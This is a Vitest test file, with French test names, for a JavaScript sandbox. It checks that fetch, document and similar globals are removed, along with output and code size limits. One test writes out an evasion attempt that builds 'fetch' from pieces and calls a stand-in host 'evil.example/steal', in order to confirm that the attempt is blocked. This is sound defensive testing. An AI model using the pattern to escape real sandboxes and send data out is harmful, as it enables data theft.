import vm from "node:vm";
import { describe, expect, it } from "vitest";
import {
  buildJsWorkerSource,
  JS_SANDBOX_MAX_CODE,
  JS_SANDBOX_MAX_OUTPUT,
} from "@/lib/security/js-sandbox";

type SandboxMessage = { ok: boolean; out?: string; err?: string };

function runSandbox(code: string): SandboxMessage {
  const messages: SandboxMessage[] = [];
  const sandbox: Record<string, unknown> = {
    console: {
      error: () => {},
      info: () => {},
      log: () => {},
      warn: () => {},
    },
    postMessage: (message: SandboxMessage) => messages.push(message),
  };
  sandbox.self = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(buildJsWorkerSource(code), sandbox, { timeout: 2000 });
  return messages[0];
}

describe("Bac à sable JavaScript — retrait effectif des capacités", () => {
  it("exécute un calcul normal et renvoie sa sortie", () => {
    const result = runSandbox("console.log('somme', 2 + 3); return 'fini';");
    expect(result.ok).toBe(true);
    expect(result.out).toContain("somme 5");
    expect(result.out).toContain("fini");
  });

  it("retire fetch, document, localStorage et navigator de la realm", () => {
    const result = runSandbox(
      "console.log(typeof fetch, typeof document, typeof localStorage, typeof navigator);"
    );
    expect(result.ok).toBe(true);
    expect(result.out?.trim()).toBe("undefined undefined undefined undefined");
  });

  it("neutralise l'accès calculé à globalThis (contournement du filtre lexical)", () => {
    const result = runSandbox(`
      const name = ["fe", "tch"].join("");
      try {
        globalThis[name]("https://evil.example/steal");
        console.log("NON_BLOQUE");
      } catch (error) {
        console.log("bloque");
      }
    `);
    expect(result.ok).toBe(true);
    expect(result.out).toContain("bloque");
    expect(result.out).not.toContain("NON_BLOQUE");
  });

  it("le constructeur de fonction ne retrouve pas les capacités retirées", () => {
    const result = runSandbox(`
      const construct = (function () {}).constructor;
      const probe = construct("return typeof fetch + ':' + typeof document;");
      console.log(probe());
    `);
    expect(result.ok).toBe(true);
    expect(result.out?.trim()).toBe("undefined:undefined");
  });

  it("refuse une sortie au-delà du plafond", () => {
    const result = runSandbox(
      `console.log("x".repeat(${JS_SANDBOX_MAX_OUTPUT + 1}));`
    );
    expect(result.ok).toBe(false);
    expect(result.err).toContain("trop volumineuse");
  });

  it("remonte une erreur d'exécution sans faire tomber la page", () => {
    const result = runSandbox("throw new Error('boum');");
    expect(result.ok).toBe(false);
    expect(result.err).toContain("boum");
  });

  it("borne la taille du code accepté par le composant", () => {
    expect(JS_SANDBOX_MAX_CODE).toBe(200_000);
    expect(JS_SANDBOX_MAX_OUTPUT).toBe(100_000);
  });
});
